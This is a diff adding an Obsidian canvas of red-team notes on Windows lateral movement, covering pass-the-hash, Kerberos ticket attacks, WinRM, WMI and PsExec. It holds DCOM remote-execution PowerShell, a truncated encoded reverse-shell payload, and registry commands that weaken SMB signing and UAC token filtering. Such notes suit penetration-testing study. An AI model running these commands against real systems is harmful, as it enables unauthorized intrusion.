@@ -1,0 +1,37 @@
+{
+	"nodes":[
+		{"id":"abf5d08a7b4f4fba","type":"text","text":"# Lateral Movement and Pivoting","x":-200,"y":69,"width":525,"height":131,"color":"1"},
+		{"id":"101afd3d1af9ddc8","type":"file","file":"NOTES/0. Redteam/2. Services/TCP 5985, 5986 - WinRM.canvas","x":-2280,"y":-395,"width":1263,"height":1050},
+		{"id":"0c1c46678d75956c","type":"file","file":"NOTES/2. Windows/WMI (Windows Management Instrumentation).md","x":-2280,"y":720,"width":1263,"height":470},
+		{"id":"101e03c10783187e","type":"file","file":"NOTES/2. Windows/sysinternals/psexec.exe/psexec.exe.md","x":-2102,"y":1280,"width":1085,"height":800},
+		{"id":"88854b4e4743d222","type":"file","file":"NOTES/99. TOOLS/impacket/impacket_psexec_smbexec.md","x":-2889,"y":1380,"width":600,"height":160},
+		{"id":"8debe4f12e08bfa4","type":"file","file":"NOTES/99. TOOLS/Metasploit/msf_psexec.md","x":-2969,"y":1640,"width":680,"height":220},
+		{"id":"2f20873f00c14083","type":"text","text":"# pass-the-hash\nInjects an **NTLM hash** for NTLM-based logins.","x":899,"y":62,"width":701,"height":138},
+		{"id":"fe312330aee8c213","type":"text","text":"# overpass-the-hash\nUses the **NTLM hash** to obtain a **Kerberos TGT**.\n\nThe essence of the overpass-the-hash lateral movement technique is to turnthe NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication.","x":899,"y":280,"width":701,"height":240},
+		{"id":"e379e67efc1a066b","type":"text","text":"# pass-the-ticket\nCaptures and replays Kerberos tickets (TGT or service tickets) to access resources without re-entering credentials.","x":899,"y":580,"width":701,"height":149},
+		{"id":"34247944c9a181d1","type":"text","text":"# WinRM","x":-800,"y":100,"width":250,"height":60},
+		{"id":"4544dcb02f1d8513","type":"text","text":"# WMI","x":-800,"y":820,"width":250,"height":60},
+		{"id":"abb683aed00f8ac9","type":"text","text":"# PSexec","x":-800,"y":1420,"width":250,"height":60},
+		{"id":"3239241e025fb304","type":"text","text":"# DCOM<br>(Distributed Component Object Model)","x":-1350,"y":2440,"width":800,"height":109},
+		{"id":"49325b2cd1602d97","type":"text","text":"```powershell\n# run in elevated terminal\n# spawn instance of calculator app in host 192.168.50.73\nPS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"192.168.112.72\"))\nPS> $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n\n# on host 192.168.50.73 to search for process\ncmd> tasklist | findstr \"calc\"\n```\n```powershell\n# reverse shell Base64 payload\nPS> $dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...\nAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\",\"7\")\n```","x":-3020,"y":2518,"width":1209,"height":562},
+		{"id":"6bd764718bf3b6fa","type":"text","text":"# silver ticket","x":899,"y":850,"width":701,"height":110},
+		{"id":"d5afcef886e216ba","type":"text","text":"# pass-the-hash\nSometimes being in the local administrators group is not enough to pass-the-hash, and depending on the Windows operating system configuration and version, some changes may be required on the target system in order for this to work.\nThe issue typically presents itself when trying to pass-the- hash from an account which isn’t an “actual” administrator (RID-500), but rather, from an account that is in the Administrators group\nFor example, if we try the psexec module from a session where our current user is in the Administrators group, but not an “actual” administrator, and we get a STATUS_ACCESS_DENIED (Command=117 WordCount=0) error, this is a good indication that registry changes may be required on the target host in order for a successful pass-the-hash attack.\n\nThe two registry entries needed on the target for this to be successful are: `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System`\n+ Add anew DWORD (32-bit) named LocalAccountTokenFilterPolicy and set its value to 1\n`HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters`\n+ Add anew DWORD (32-bit) named RequireSecuritySignature and set its value to 0\n\nNonetheless, if we already have a session on the target as an administrator, and would like to “modify” those registry settings to help us with the attack, we can do so with a couple simple powershell one-liners from a Powershell shell: \n```powershell \nPS> Set-ItemProperty -Path HKLM: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System - Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord\nPS> Set-ItemProperty -Path HKLM: \\System\\CurrentControlSet\\Services\\LanManServer\\Parameters - Name RequireSecuritySignature -Value 0 -Type DWord\n```\nAlternatively, we could use the “reg” command to accomplish the same: \n```powershell\nC:\\> reg add \"HKEY_LOCAL MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\nC:\\> reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlset\\Services\\LanManServer\\Parameters\" /v RequireSecuritySignature /t REG_DWORD /d 0 /f\n```\nThe previous registry changes, particularly the `LocalAccountTokenFilterPolicy` setting, essentially allow non RID-500 user accounts (users in the local administrator group for instance) to successfully pass-the- hash in some cases.","x":2280,"y":-246,"width":1460,"height":755}
+	],
+	"edges":[
+		{"id":"c62e6411e1a89418","fromNode":"abf5d08a7b4f4fba","fromSide":"bottom","toNode":"abb683aed00f8ac9","toSide":"right"},
+		{"id":"f08e5076aae69de9","fromNode":"abf5d08a7b4f4fba","fromSide":"bottom","toNode":"34247944c9a181d1","toSide":"right"},
+		{"id":"21133dab5db551c6","fromNode":"abf5d08a7b4f4fba","fromSide":"bottom","toNode":"4544dcb02f1d8513","toSide":"right"},
+		{"id":"f70a2c05d39299be","fromNode":"abf5d08a7b4f4fba","fromSide":"right","toNode":"2f20873f00c14083","toSide":"left"},
+		{"id":"1cc1179f73079447","fromNode":"34247944c9a181d1","fromSide":"left","toNode":"101afd3d1af9ddc8","toSide":"right"},
+		{"id":"ba43b14da30cf4ed","fromNode":"101e03c10783187e","fromSide":"left","toNode":"88854b4e4743d222","toSide":"right"},
+		{"id":"29faa6212a7c30e8","fromNode":"101e03c10783187e","fromSide":"left","toNode":"8debe4f12e08bfa4","toSide":"right"},
+		{"id":"e1bea145731e78d1","fromNode":"abf5d08a7b4f4fba","fromSide":"right","toNode":"fe312330aee8c213","toSide":"left"},
+		{"id":"7d7c1b50e3742984","fromNode":"abf5d08a7b4f4fba","fromSide":"right","toNode":"e379e67efc1a066b","toSide":"left"},
+		{"id":"20b9aa7f36bd39ca","fromNode":"4544dcb02f1d8513","fromSide":"left","toNode":"0c1c46678d75956c","toSide":"right"},
+		{"id":"139610541d20cab5","fromNode":"abb683aed00f8ac9","fromSide":"left","toNode":"101e03c10783187e","toSide":"right"},
+		{"id":"86a02e9756ec299d","fromNode":"abf5d08a7b4f4fba","fromSide":"bottom","toNode":"3239241e025fb304","toSide":"right"},
+		{"id":"928d90d06f2fe4b0","fromNode":"3239241e025fb304","fromSide":"left","toNode":"49325b2cd1602d97","toSide":"right"},
+		{"id":"338388cf500ff8ca","fromNode":"abf5d08a7b4f4fba","fromSide":"right","toNode":"6bd764718bf3b6fa","toSide":"left"},
+		{"id":"09c7b1c3ff471ae3","fromNode":"2f20873f00c14083","fromSide":"right","toNode":"d5afcef886e216ba","toSide":"left"}
+	]
+}
